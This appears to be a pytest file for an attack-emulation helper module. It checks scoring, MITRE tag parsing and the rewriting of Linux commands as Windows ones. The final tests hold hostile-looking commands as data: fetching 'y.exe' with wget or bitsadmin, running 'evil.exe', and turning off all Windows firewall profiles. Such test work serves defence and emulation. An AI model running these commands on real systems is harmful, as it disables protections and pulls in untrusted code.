"""Tier 1 pure, deterministic helpers in gbse.py (no I/O, no LLM).

These underpin every score, so they are the cheapest high-value tests to keep
green. Each case is a known input -> known output.
"""

import pytest

from procedure_generator import gbse


# --------------------------------------------------------------------------- #
# szss: overlap coefficient normalised by the *larger* set.
# both-empty is defined as identical (1.0); disjoint is 0.0.
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "a,b,expected",
    [
        ([], [], 1.0),  # both empty -> treated as identical
        (["a", "b"], ["a", "b"], 1.0),  # identical
        (["a"], ["b"], 0.0),  # disjoint
        ([], ["a"], 0.0),  # one side empty
        (["a", "b"], ["a", "b", "c"], 2 / 3),  # subset: |inter|=2 / max|.|=3
        (["a", "a", "b"], ["b"], 0.5),  # set-dedup: |{a,b} & {b}| / max(2,1)
    ],
)
def test_szss(a, b, expected):
    assert gbse.szss(a, b) == pytest.approx(expected)


# --------------------------------------------------------------------------- #
# lsc: logsource category = last path segment.
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "src,expected",
    [
        ("windows/process_creation", "process_creation"),
        ("linux/process_creation", "process_creation"),
        ("process_creation", "process_creation"),  # no slash -> unchanged
        ("", ""),
    ],
)
def test_lsc(src, expected):
    assert gbse.lsc(src) == expected


# --------------------------------------------------------------------------- #
# _norm: collapse whitespace, strip, lowercase; None-safe.
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "raw,expected",
    [
        ("  Foo   BAR ", "foo bar"),
        ("Already normal", "already normal"),
        ("tabs\tand\nnewlines", "tabs and newlines"),
        (None, ""),
        ("", ""),
    ],
)
def test_norm(raw, expected):
    assert gbse._norm(raw) == expected


# --------------------------------------------------------------------------- #
# _tags: pull MITRE technique IDs out of attack.* tags, upper-cased.
# --------------------------------------------------------------------------- #
def test_tags_extracts_and_upcases():
    tags = ["attack.t1105", "attack.t1021.001", "attack.T1059", "persistence", "foo.bar"]
    assert gbse._tags(tags) == ["T1105", "T1021.001", "T1059"]


def test_tags_empty_and_none():
    assert gbse._tags([]) == []
    assert gbse._tags(None) == []


# --------------------------------------------------------------------------- #
# parse_telemetry_expected: keyword -> telemetry class, sorted + deduped.
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "text,expected",
    [
        ("", []),
        (None, []),
        ("Process creation event with command line arguments", ["process"]),
        ("Outbound network connection over TCP", ["network"]),
        ("File written to disk, requires Sysmon", ["file"]),
        ("Credential dump via LSASS", ["identity"]),
        ("Process spawns and opens a network socket", ["network", "process"]),
    ],
)
def test_parse_telemetry_expected(text, expected):
    assert gbse.parse_telemetry_expected(text) == expected


# --------------------------------------------------------------------------- #
# derive_windows_command: Linux -> Windows reconstruction, one test per branch.
# conv_idx empty unless the test is specifically exercising conversion-note reuse.
# --------------------------------------------------------------------------- #
def _conv(notes):
    idx, _bits = gbse.build_conv_index(notes)
    return idx


def test_dwc_conversion_note_exact_match():
    idx = _conv([{"converted_action": "ls -la", "original_action": "dir"}])
    assert gbse.derive_windows_command("ls -la", idx, None) == ("dir", "conversion_note")


def test_dwc_de_wine():
    assert gbse.derive_windows_command("wine evil.exe", [], None) == ("evil.exe", "de_wine")


def test_dwc_ssh_to_rdp_when_technique_is_rdp():
    cmd, prov = gbse.derive_windows_command("ssh user@10.0.0.5", [], None, tech="T1021.001")
    assert (cmd, prov) == ("mstsc /v:10.0.0.5", "technique_pattern")


def test_dwc_ssh_without_rdp_technique_is_cross_platform():
    # Same ssh command, but no RDP technique -> must NOT become mstsc.
    cmd, prov = gbse.derive_windows_command("ssh user@10.0.0.5", [], None, tech="")
    assert prov == "cross_platform"
    assert "mstsc" not in cmd


def test_dwc_firewall_disable_technique_pattern():
    cmd, prov = gbse.derive_windows_command(
        "sudo systemctl stop firewalld", [], None, tech="T1562.001"
    )
    assert (cmd, prov) == ("netsh advfirewall set allprofiles state off", "technique_pattern")


def test_dwc_wget_exe_maps_to_bitsadmin():
    cmd, prov = gbse.derive_windows_command("wget http://x/y.exe -O /tmp/y.exe", [], None)
    assert prov == "bitsadmin_map"
    assert cmd.startswith("bitsadmin /transfer")
    assert "http://x/y.exe" in cmd


def test_dwc_cross_platform_strips_sudo():
    assert gbse.derive_windows_command("sudo whoami", [], None) == ("whoami", "cross_platform")
